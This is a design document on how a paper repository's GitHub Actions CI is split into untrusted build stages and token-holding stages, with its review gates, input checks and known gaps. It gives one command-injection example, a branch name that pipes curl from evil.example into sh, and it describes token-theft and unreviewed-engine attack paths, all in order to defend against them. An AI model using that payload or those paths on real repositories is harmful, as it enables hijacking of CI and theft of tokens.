(design-paper-ci)=

# How a paper repository's CI is built

Every paper repository carries a set of workflow files created by `oak bootstrap` on initialization, together with a composite action they all call. These files act as **launchers**: each one resolves an engine version, checks the engine out at it, and runs it, holding as little logic as possible. A paper moves to a newer engine by changing the version its `myst.yml` points to, so the launchers are identical across every paper and stay frozen once copied[^why-indirect]. A change that needs new launchers is a breaking release, and `oak upgrade` re-copies the files (opening a PR).

The rest of the launchers' shape comes from the need to build content you don't trust. The first part of this page follows that content from the pull request that brings it in to the jobs that hold tokens, and shows the check that protects each step. The second part lists the rules a change to the launchers has to keep.

Two terms recur below. A flow that needs a token runs as two workflows: **Stage 1** builds the pull request's content with no secrets, and **Stage 2** acts on the result from the base branch, holding the token. A **gated** file is one listed in `CODEOWNERS`, so a change to it needs an editor's review before it can merge.

[^why-indirect]: A fix ships once, in the engine, and reaches every paper without an edit to its workflows.

:::{tip} In short
An author with push access opens a pull request from a branch. Stage 1 runs their content on a GitHub-hosted runner, a fresh machine discarded after the job, with a read-only token. Their pull request reaches `main` through the `protect-main` rule, which requires the editorial checks to pass and requires an editor's review for any change under `CODEOWNERS`. The author's code runs only in jobs that hold no secret, and every job that holds a secret runs code from `main` or from an editor's `v*` tag.

A pull request from a fork, the default for an outside contributor, adds a step before anything runs: GitHub holds the run for a maintainer's approval when the contributor has never had anything merged into the repository. That is GitHub's default for a public repository, `oak bootstrap` leaves it there, and the [runbook](src:src/messages.ts#L450-L453) tells the editor to expect the approval click. Once approved, the fork's run builds like any other, and any edit it makes to a gated file needs an editor's review before it can merge. The checks comment also [flags](src:src/checks.ts#L216-L223) a pull request that touches `.github/`, `CODEOWNERS` or `paper-environment.yml`.
:::

(design-paper-ci-trust)=

## How the launchers handle untrusted content

(design-paper-ci-files)=

### The files

- [`ci.yml`](src:templates/paper/.github/workflows/ci.yml) and [`preview-deploy.yml`](src:templates/paper/.github/workflows/preview-deploy.yml) are the two stages of the site preview. On a push to `main`, `ci.yml` also deploys to GitHub Pages.
- [`check.yml`](src:templates/paper/.github/workflows/check.yml) and [`check-post.yml`](src:templates/paper/.github/workflows/check-post.yml) are the two stages of the editorial checks.
- [`publish.yml`](src:templates/paper/.github/workflows/publish.yml), [`prepare.yml`](src:templates/paper/.github/workflows/prepare.yml) and [`version-bump.yml`](src:templates/paper/.github/workflows/version-bump.yml) handle publishing actions, and are started by a `v*` tag, an editor's manual dispatch and a weekly schedule. Author content reaches them only after it has merged.
- [`.github/actions/engine/action.yml`](src:templates/paper/.github/actions/engine/action.yml) is the composite action every workflow calls, and [`pins.yml`](src:templates/paper/.github/actions/engine/pins.yml) beside it, which names the engine and journal repositories for the action and for local `oak`.
- [`CODEOWNERS`](src:templates/paper/CODEOWNERS), and the optional `paper-environment.yml`, a conda environment the action installs before the engine runs, in the jobs that build.

(design-paper-ci-codeowners)=


### Who can change what

:::{figure} img/paper-ci-code.svg
:alt: All seven workflows call action.yml. The action takes the engine repository from pins.yml, installs paper-environment.yml in the build jobs, and takes the version from myst.yml, then checks out the engine at that version and runs the verb. Everything except myst.yml is inside the CODEOWNERS gate. Local oak also reads pins.yml.

The gate covers the launchers, the repository pins and the environment. `myst.yml`, with its plugins and the engine version, stays with the author.
:::

The author changes the content and `myst.yml`, including the engine version, without an editor's review. Tags, secrets and repository settings stay with the editors through GitHub's own permissions.

(r92)=

[`CODEOWNERS`](src:templates/paper/CODEOWNERS#L3-L5) tells GitHub who must review a change to the files it names. It only blocks a merge behind a branch rule that requires a code owner's review, and the pull request's workflows still run before anyone reviews it. `oak bootstrap` creates that rule as [`protect-main`](src:src/bootstrap.ts#L446-L480). Our CODEOWNERS names three things:

- `.github/`, so an editor approves any change to the launchers or to `pins.yml`, which could otherwise name a different engine repository, or a journal repository whose MyST plugins run at build time.
- `CODEOWNERS` itself, so a pull request cannot remove the gate in the same change.
- `paper-environment.yml`. Installing a conda package runs its install scripts, so the file decides code that runs in every build. The action installs it only in jobs that hold no secret, as [below](#r207).

(design-paper-ci-two-stages)=

### Keeping the build away from the token

:::{figure} img/paper-ci-stages.svg
:alt: Two flows start from a pull request or a push. Stage 1 builds or validates with a read-only token and passes an artifact to Stage 2, which runs from the base branch with tokens and posts the preview or the check result. Tag, dispatch and schedule workflows run once, after merge.

The arrow between stages is the only thing that crosses from the read-only side to the side with tokens, and it carries files, not code.
:::

Building a pull request runs the author's MyST configuration, their plugins, and whatever their execution environment installs. The useful outcomes all need write access: posting a check verdict, deploying a preview, commenting on the pull request. A `pull_request` run from a fork receives no secrets and a read-only token, so it cannot do any of those.

GitHub's answer is `pull_request_target`, which runs with the base repository's secrets, and checking the pull request's code out under it is dangerous. A MyST plugin in the fork could read the token `actions/checkout` leaves in `.git/config` and send it anywhere, and that token can push to the paper repository.

So each flow that needs a token is two workflows, as the figure shows: `ci.yml` and `preview-deploy.yml` for the preview, `check.yml` and `check-post.yml` for the editorial checks.

(r13)=

Permissions are granted per job, so the job that builds author content never holds a write scope. In `ci.yml` the workflow default is [`contents: read`](src:templates/paper/.github/workflows/ci.yml#L12-L13), and [`pages: write` and `id-token: write`](src:templates/paper/.github/workflows/ci.yml#L44-L49) sit on the push-only `deploy-pages` job. Granted at workflow level, they would be held by the `build` job too, which on a push to `main` runs whatever content was just merged, and a plugin in that content could deploy its own site over the paper's.

A branch pull request goes through the same two stages. A check then behaves the same whoever opened the pull request.

(r207)=

Branches cannot reach the tokens at all. A repository secret is readable by every workflow on every branch, and an author with push access can push a branch carrying a workflow of their own, so `oak bootstrap` stores every secret in a GitHub environment instead. The Cloudflare secrets live on `preview` and the Zenodo tokens on `zenodo-prepare`, both admitting only `main`, and on `zenodo-publish`, which admits only `v*` tags and waits for a required reviewer. Each job that reads a secret declares its environment, and a job on any other ref is refused before it starts. Re-running `oak bootstrap` with the values sets them on the environments and deletes the repository-level copies.

Inside those jobs the paper's code never runs. `publish.yml` builds in a job with no secrets and hands the output to the deposit job, which runs `oak release --no-build`. The action installs `paper-environment.yml` only when a job asks, and only the build jobs ask. And the engine runs `wrangler` from an empty directory, so a `.npmrc` or `node_modules` in the paper cannot choose which wrangler receives the Cloudflare token.

(design-paper-ci-stage2-inputs)=

### What Stage 2 takes from the artifact

(r91)=

Stage 2 runs in the base context, but everything in the artifact is under the pull request's control: the author's content runs in the job that writes it, and on a pull request GitHub runs the pull request's own copy of the Stage 1 workflow file. So Stage 2 takes every value it can from its own `workflow_run` event, which GitHub populates. For example, `check-post.yml` [posts the check run](src:templates/paper/.github/workflows/check-post.yml#L56-L65) on the commit in `workflow_run.head_sha`. A Stage 2 that took the commit from the artifact would put a green check on whichever commit the fork named.

(r136)=

The artifact carries the built site or the checks report, plus a file with the pull request number. The number is the one value Stage 2 cannot get from its own event, because `workflow_run.pull_requests` is empty when the pull request came from a fork. Both Stage 2 workflows check it twice before using it, in `check-post.yml`'s [`meta` step](src:templates/paper/.github/workflows/check-post.yml#L35-L53) and `preview-deploy.yml`'s [`pr-owner` step](src:templates/paper/.github/workflows/preview-deploy.yml#L36-L54):

- **Shape.** Digits, anchored to the whole string, by the rule for [values written to `$GITHUB_OUTPUT`](#r155).
- **Ownership.** The API is asked which commit that pull request heads at, and the answer must be the commit this run built. A fork that writes a well-formed number belonging to somebody else's open pull request would otherwise have the repository comment on that pull request, with a verdict or a preview link the fork chose.

The engine [checks the shape again](src:src/preview.ts#L100-L119) when it reads the number, because the value also becomes part of a `gh api` path, and deletes the file before deploying.

(r154)=

The artifact's files are untrusted in the same way its values are. A paper preview is static MyST output, so before deploying, the engine [removes](src:src/preview.ts#L121-L144) the files that would let it run code or rewrite responses on the journal's Cloudflare Pages account.[^pages-control] The strip lives in the engine, which Stage 2 checks out at the base branch's version, because a fork could delete a strip in `ci.yml` in the same commit.

[^pages-control]: The strip removes `_worker.js`, `functions/`, `_routes.json`, `_redirects`, `_headers` and `_middleware.js` from the deploy root. A `_worker.js` or `functions/` controls every response on the preview's URL, the page editors open to review the paper. And since `pages.dev` is on the Public Suffix List, every preview of a project shares `<project>.pages.dev`, so one preview can set cookies that all the others receive.

(design-paper-ci-engine-ref)=

### Which engine code runs

The composite action [checks the engine out](src:templates/paper/.github/actions/engine/action.yml#L59-L63) from two settings:

- `pins.yml` names the engine repository (gated, see [Who can change what](#design-paper-ci-codeowners)).
- The paper's own `myst.yml` names the version, under `project.options.oaktree-sapling.version`. It is ungated, so an author can move their paper to a newer engine in an ordinary pull request.

(r196)=

Pinning the repository and letting only the version float keeps the version inside the engine repository, and that is a weaker guarantee than it sounds. A public repository that accepts pull requests also resolves `refs/pull/N/merge` for any unmerged one. A contributor who opens a pull request against the engine, adding their own `dist/cli.cjs`, and then sets a paper's version to that pull request's merge ref has pointed the paper at code nobody reviewed, while the paper's pull request looks like a one-line metadata edit. Once merged, every job on `main` that holds a secret would run it. The trust boundary is therefore the repository and the kind of ref together: a release tag, a raw commit or a pull request ref.


(r41)=

Two checks limit which kind of ref the version can name. The engine's [`ci/run.sh`](src:ci/run.sh#L14-L21) refuses to run without `dist/cli.cjs`, which is committed onto release tags and nothing else, so a version pointing at a branch tip fails with a message saying so. And on a pull request from a fork, the action's [`refclass` step](src:templates/paper/.github/actions/engine/action.yml#L45-L57) refuses a bare 40-character commit or a `refs/pull/N/merge` before the engine is checked out, so the paper's pull request goes red while it is still under review. Raw commits and pull request refs are for testing the engine from inside its own repository. Release tags, dev tags and branches pass. A fork that also deletes the step from `action.yml` gets a green run, but that edit is under `.github/` and needs an editor's review to merge. The step exists to make a bad version visible before review; Stage 1 already runs the author's code, so an engine chosen by the fork gains nothing there.

The check runs in the workflow because it decides which engine to fetch, so there is no engine yet to run it. [`src/ref.ts`](src:src/ref.ts#L53-L73) keeps the same policy as a tested model that nothing calls.

The `refclass` step fires only on a pull request from a fork. On any other event it exits 0, because a push or a `workflow_run` builds a ref the base repository controls, so a green run is not by itself evidence that the guard fired.

(design-paper-ci-limits)=

### Known gaps

Beyond the summary at the top of this page, these gaps remain:

- **The check verdict is authored by Stage 1.** Stage 2 posts the report Stage 1 computed, so a fork that rewrites `check.yml` can post a passing report. That rewrite is itself a change under `.github/`, so the comment flags it and merging it needs an editor. The verdict is a signal for the editor and not an authorisation decision, and the code-owner review is what stands between such a pull request and `main`.
- **The engine version on `main` is ungated.** `protect-main` requires no approval for `myst.yml`, and `refclass` fires only on fork pull requests, so an author can merge a version pointing at another engine pull request's merge ref, and the jobs on `main` that hold secrets then run that engine. Closing it needs an allowlist of release and dev tags enforced on every event.
- **The branch rule can be removed.** An admin who deletes `protect-main` turns `CODEOWNERS` back into documentation.
- **Anything we didn't consider.** See a gap in our design? Let us know through our issues or contact us at `<hidden for now>`

(design-paper-ci-rules)=

## Rules for changing the launchers

(design-paper-ci-shell-values)=

### Values that reach a script

(r153)=

A workflow passes a value to a `run:` script through `env:`, not by splicing `${{ }}` into the script body. The runner substitutes a spliced expression as text before bash parses the line, so a fork could name its branch `x";curl evil.example|sh;"` and get `${{ github.head_ref }}` spliced into a script. The composite action's [`dispatch` step](src:templates/paper/.github/actions/engine/action.yml#L72-L80) needs its arguments to word-split, and does that with `set -f` so a `*` in an argument stays a `*`. [`test/frozen-guards.test.ts`](src:test/frozen-guards.test.ts#L225-L255) fails on any frozen `run:` containing `${{`, to avoid this weakness "class" in the future.

(r155)=

Any value written to `$GITHUB_OUTPUT` is checked before writing. The file is line-oriented, so a value containing a newline appends a second `name=value` pair of the writer's choosing to the step's outputs. Two values written there are fork-controlled. The engine version: the action's [`ref` step](src:templates/paper/.github/actions/engine/action.yml#L17-L31) reads it out of the paper's own `myst.yml`, where a YAML block scalar can span two lines, and refuses anything outside `A-Za-z0-9._/-`. The [pull request number](#r136): Stage 2 reads it out of the artifact and accepts only digits.

(design-paper-ci-bad-input)=

### Bad input fails with a clear error

(r97)=

The engine repository in `pins.yml` and the version in `myst.yml` both fail loudly when absent. `yq` prints the literal `null` for a missing key; the [`ref`](src:templates/paper/.github/actions/engine/action.yml#L20-L24) and [`pins`](src:templates/paper/.github/actions/engine/action.yml#L36-L41) steps stop with the file and the key instead.

(r137)=

Stage 2 rejects malformed input with a clear error. A report that is not JSON, or JSON without the `checkRun.conclusion` field, makes `check-post` [exit 1](src:src/cli.ts#L820-L833) naming the file and what is wrong with it. An absent `pr-number` file means a push build and is not an error. A present and malformed one is a corrupt or hostile artifact, so Stage 2 fails.

`check.yml` succeeds whenever it wrote a report, a failing one included, because `check-post.yml` runs only after a successful Stage 1. It fails only when the engine dies before writing one.

(design-paper-ci-artifact-contract)=

### The artifact between two launcher versions

(r146)=

The artifact is an interface between two versions of the launchers. Stage 1 runs from the pull request's head and Stage 2 from the base, so on the pull request that installs new launchers, the new Stage 1 meets the old Stage 2. Adding a field is safe. Removing one breaks every repository still running the previous Stage 2, on the same pull request that would have updated it, and an editor looking at a red required check reasonably declines to merge. So a field is removed in two releases: first a Stage 2 that no longer reads it, then a Stage 1 that no longer writes it.

(design-paper-ci-concurrency)=

### Concurrency keys

(r15)=

Runs are grouped so a new push supersedes an in-flight run for the same pull request, and the group key includes the head repository as well as the branch, in [`ci.yml`](src:templates/paper/.github/workflows/ci.yml#L15-L18) and [`check.yml`](src:templates/paper/.github/workflows/check.yml#L15-L18). Two forks both working on a branch called `main` would otherwise share a group and cancel each other. A cancelled Stage 1 uploads no artifact, so Stage 2 never fires, and the required check never arrives, so the pull request cannot merge until someone pushes again.

(r94)=

Both stages key on the head repository, and the pull request group in each Stage 1 workflow is distinct from its push-to-`main` group. A fork opening a pull request from a branch called `main` would otherwise land in the same group as the repository's own `main` and cancel an in-flight Pages deploy. The Stage 2 keys are in [`preview-deploy.yml`](src:templates/paper/.github/workflows/preview-deploy.yml#L16-L19) and [`check-post.yml`](src:templates/paper/.github/workflows/check-post.yml#L17-L20).

(design-paper-ci-secrets-in-if)=

### Testing for a secret

(r172)=

A workflow reads a secret into `env:` and tests it in `run:`[^why-test-secret-in-run]. A `secrets` reference in a step's `if:` makes GitHub reject the whole workflow file. For a file that only runs on `workflow_dispatch`, such as `prepare.yml`, the rejection shows only when someone runs it. `prepare.yml` [tests the sandbox token](src:templates/paper/.github/workflows/prepare.yml#L26-L34) this way, and [`test/frozen-guards.test.ts`](src:test/frozen-guards.test.ts#L299-L304) fails on any frozen `if:` that reads `secrets`.

[^why-test-secret-in-run]: The `secrets` context does not exist in a step-level `if:`.

(design-paper-ci-testing)=

### How the launchers are tested

(r99)=

[`test/frozen-guards.test.ts`](src:test/frozen-guards.test.ts#L32-L44) pulls a step's `run:` script out of the YAML and executes it as bash. A test that only asserted which files `oak bootstrap` stamps into a repository would pass with every guard on this page deleted, and these files run in every paper repository with the tokens described above.

(r90)=

Each guard carries a case that fails against the unfixed step, for example [the fork `refs/pull/7/merge` case](src:test/frozen-guards.test.ts#L55-L78) for `refclass` and [the fabricated pull request number](src:test/frozen-guards.test.ts#L121-L160) for `pr-owner`. A guard written against a specific attack is tested with that attack's input.

This is bash, not a runner: `${{ }}` is already resolved by the time a real step runs, `$GITHUB_OUTPUT` is a real file there, and the shell setup differs. So it covers script logic plus the expression-level faults checked statically. A green run here is necessary and not sufficient, and the live conformance run exercises the workflows on a real runner.
